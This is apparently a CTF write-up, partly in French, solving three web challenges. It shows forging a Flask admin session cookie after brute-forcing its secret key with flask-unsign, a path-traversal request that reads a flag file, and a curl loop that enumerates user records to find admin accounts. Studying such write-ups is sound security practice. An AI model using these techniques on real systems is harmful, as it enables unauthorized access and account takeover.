ctfd_4c1ae11476ebedc6d65fee8e4bd03af5d2e196f11b7e901ce90615a47d92ac80
# Web
## web1

### flask-unsign
```bash
flask-unsign --decode --cookie '.eJw9zT0OwyAMQOG7eGZwwPzlMpVjTFSpIVKAqcrdm6nrG773hc-571pe7wbruKYaaGcThRWyJuuXyBI45-pQLFWm4ClKjSE4b-uSkHlzZUOKriZUQpIkmUtCBwb64DH7Y3E5noGB2fVqfOg_3T_epSb5.ZeJE3Q.DJlgFNkiP09zc8GD9sZQkc124Qs'
```
	{'logged_in': True, 'nonce': '9e82517ac6a99f30c24fa46547cf766352f180aab3db0473f80e404c8c9ad803', 'status': 'admin', 'username': 'admin'}

#### bruteforce le cookie damin
#### create wordlist
```python
for i in range(100000000):

    print(str(i).rjust(8, '0'))
```

```bash
flask-unsign --wordlist wdl.txt --unsign --cookie '.eJw9zT0OwyAMQOG7eGZwwPzlMpVjTFSpIVKAqcrdm6nrG773hc-571pe7wbruKYaaGcThRWyJuuXyBI45-pQLFWm4ClKjSE4b-uSkHlzZUOKriZUQpIkmUtCBwb64DH7Y3E5noGB2fVqfOg_3T_epSb5.ZeJE3Q.DJlgFNkiP09zc8GD9sZQkc124Qs' --no-literal-eval
```
	[*] Session decodes to: {'logged_in': True, 'nonce': '9e82517ac6a99f30c24fa46547cf766352f180aab3db0473f80e404c8c9ad803', 'status': 'admin', 'username': 'admin'}
	[*] Starting brute-forcer with 8 threads..
	[+] Found secret key after 7808 attempts
	b'00007676'

secret key trouver
#### signé un cookie non connecté avec le secret key
```bash
flask-unsign --decode --cookie '.eJwNzEsOwyAMBcC7eJ0FxnziXKZy4AVVqohUYFX17u0cYD70ultDfTw7HfO9sFG_ewEd5EXzGVGEkWJF2tUsMoLnCka99NTMYlE0qBdXsmXjeMkuSV0wRxuNaXON_9UWxqTvDz3LIJM.ZeJZVQ.At8byR-5X7Pu2XZD3Xao0ovbdsI'
```
	{'logged_in': True, 'nonce': '2397b5ec31e65de689aa51e421de1edf9b9713a53949230c7a7a15f3836904a0', 'status': 'guest'}
                                                                                                                                                            
```bash
flask-unsign --sign --cookie "{'logged_in': True, 'nonce': '2397b5ec31e65de689aa51e421de1edf9b9713a53949230c7a7a15f3836904a0', 'status': 'admin', 'username': 'admin'}" --secret '00007676'
```
	.eJw9zTsOhDAMANG7uE4Rx_lgLrMyiUFIECSSVCvuvlTbTvHmC8e1bVo-e4W530MN1KtmhRkccVqCZkKNoWicWCSgeodFUcvKCyckCcSeHdmcJAmGlSaKbL1YMNC69NFeS8r5DgyMpneVU__p-QHikSbL.ZeJa-Q.r_qw7aeLexUSFaig4cEFKityKXo

## web2
LFI sur burpsuite
```
/api/notes/63dafad2-e112-4982-980c-d1c64b9cc07f/../../../../home/user/flag.txt
```

## web 3
In source code
```
<!-- 
                                Note for admins : 
    For the sake of security, remove the bloody swagger UI from the production build.
    -->
```

On a swagger
```
curl http://worker06.gcc-ctf.com:12599/api/v1/user/1
```
	{"admin":false,"id":1,"username":"danny_hernandez114"}

```
for i in {1..100};do curl "http://worker05.gcc-ctf.com:12210/api/v1/user/$i";done > userList
```

```
cat userList | grep true 
```
	{"admin":true,"id":9,"username":"jessica_cruz82"}
	{"admin":true,"id":24,"username":"megan_bell139"}
	{"admin":true,"id":31,"username":"joseph_torres69"}

